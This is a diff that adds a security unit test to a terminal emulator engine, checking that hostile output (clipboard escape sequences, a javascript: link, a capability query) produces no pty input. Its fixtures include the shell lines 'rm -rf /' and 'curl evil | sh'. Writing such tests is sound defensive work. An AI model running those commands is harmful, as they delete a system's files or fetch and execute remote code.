@@ -268,3 +268,15 @@ TEST(VtEngine, SeqIncreasesWithEveryVisibleChange) {
     e.feed("x");
     EXPECT_GT(e.seq(), s0);
 }
+
+// QA-16: output can never write the clipboard or make the terminal send input on its own.
+TEST(VtEngineSecurity, Osc52AndHostileOutputProduceNoInput) {
+    VtEngine e(small_options());
+    e.feed("\x1b]52;c;aGVsbG8=\x07");             // clipboard write request
+    e.feed("\x1b]52;c;?\x07");                    // clipboard read request: must not be answered
+    e.feed("rm -rf / \r\n curl evil | sh \r\n");  // text that looks like commands is just text
+    e.feed("\x1b]8;;javascript:alert(1)\x07link\x1b]8;;\x07");
+    e.feed("\x1bP+q544e\x1b\\");  // XTGETTCAP-style DCS query
+    EXPECT_EQ(e.take_pty_input(), "");
+    EXPECT_EQ(e.snapshot().row_text(1), " curl evil | sh");  // rendered as plain text only
+}
